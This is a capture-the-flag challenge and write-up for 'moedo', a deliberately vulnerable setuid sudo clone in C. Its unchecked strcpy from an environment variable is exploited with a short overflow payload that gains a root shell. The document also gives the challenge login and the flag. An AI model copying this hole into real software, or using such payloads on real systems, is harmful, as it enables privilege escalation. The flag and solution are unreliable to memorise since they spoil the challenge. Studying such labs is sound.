# moedo

We've created a moe alternative to sudo called __moedo__.

If you can bypass its moe secuirty you'll be awarded with the flag!

> `telnet moe.uctf.ir 7002`\
> Username: `mashiro`\
> Password: `Qh3VRn@23jv43Q`

<details>
<summary><strong>moedo</strong> source code:</summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <grp.h>

#define MOE_ENOUGH 0x30e

int check_moe(int uid)
{
    struct group *moe_group = getgrnam("moe");
    int moeness = 0;

    int ngroups;
    gid_t *groups;

    if (moe_group == NULL)
        return 0;

    ngroups = getgroups(0, NULL);
    groups = malloc(ngroups * sizeof(*groups));
    getgroups(ngroups, groups);
    for (int i = 0; i < ngroups; i++)
    {
        if (groups[i] == moe_group->gr_gid)
        {
            moeness = MOE_ENOUGH;
            break;
        }
    }

    free(groups);
    return moeness;
}

int main(int argc, char *argv[])
{
    uid_t uid = getuid();
    uid_t gid = getgid();
    int moeness = check_moe(uid);

    char *custom_chant = getenv("MOE_CHANT");
    char chant[] = "Moe Moe Kyun!";

    if (argc < 2)
    {
        fputs("Missing command\n", stderr);
        return 1;
    }

    if (custom_chant)
        strcpy(chant, custom_chant);

    printf("UID: %u - GID: %u - Moe: %x\n", uid, gid, moeness);

    if (moeness != MOE_ENOUGH)
    {
        fputs("You're not moe enough!\n", stderr);
        return 1;
    }

    if (setuid(0) != 0)
    {
        perror("setuid() failed");
        return 1;
    }
    if (setgid(0) != 0)
    {
        perror("setgid() failed");
        return 1;
    }

    puts(chant);

    if (execvp(argv[1], &argv[1]) != 0)
    {
        perror("execv() failed");
        return 1;
    }

    return 0;
}
```
</details>

## Write Up

Looking at the source code we see that `custom_chant` string (obtained from `MOE_CHANT` environment variable) is being copied into `chant` buffer without its length being checked. This is a classic case of buffer overflow vulnerability.

```c
    if (custom_chant)
        strcpy(chant, custom_chant);
```

In order to bypass the `moe` group check we have to set the `moeness` variable to `MOE_ENOUGH` (`0x030e`). We can leverage the buffer overflow vulnerability discovered above to overwrite the value of `moeness`.

```c
uid_t uid = getuid();
uid_t gid = getgid();
int moeness = check_moe(uid);

char *custom_chant = getenv("MOE_CHANT");
char chant[] = "Moe Moe Kyun!";
```

`chant` buffer is of length 14 (the length of the string "Moe Moe Kyun!" which is 14). So, to overwrite `moeness` we'll have to set `MOE_CHANT` environment variable to a string of length 26 (sizeof(chant)=14 + sizeof(custom_chant)=8 + sizeof(moeness)=4).

> On x86 machines (the architecture of the server) stack piles __bottom-up__

Let's give it shot:

```
moehost:~$ moedo sh
UID: 1001 - GID: 1001 - Moe: 0
You're not moe enough!

moehost:~$ MOE_CHANT='============================' moedo sh
UID: 1001 - GID: 1001 - Moe: 3d3d
You're not moe enough!
```

Sure enough, we could change the `Moe` value! (`3d` is the hex ASCII for `=`)

But we need to set the value of `moeness` specifically to `0x30e`. To do that we just have to replace the last two characters of our string with 0x0e and 0x03.

> x86 systems are 'little-endian', which means bytes are stored in the reverse order of what we humans are used to.

```
moehost:~$ MOE_CHANT=$'==========================\x0e\x03' moedo sh
UID: 1001 - GID: 1001 - Moe: 30e
==========================
~ # whoami
root
~ # cat /root/flag
uctf{m45h1r0_d1dn7_61v3_up}
~ #
```

## Flag

uctf{m45h1r0_d1dn7_61v3_up}

## Categories

- [ ] Web
- [ ] Reverse
- [X] PWN
- [ ] Misc
- [ ] Forensics
- [ ] Cryptography
- [ ] Steganography

## Points

| Warm up | This Challenge | Evil |
| ------- |:--------------:| ----:|
| 25      | 300-350        | 500  |

## Resources

- No file is shared with the contestants.
- The [dist](dist/) directory contains the files used in the Alpine Linux sandbox.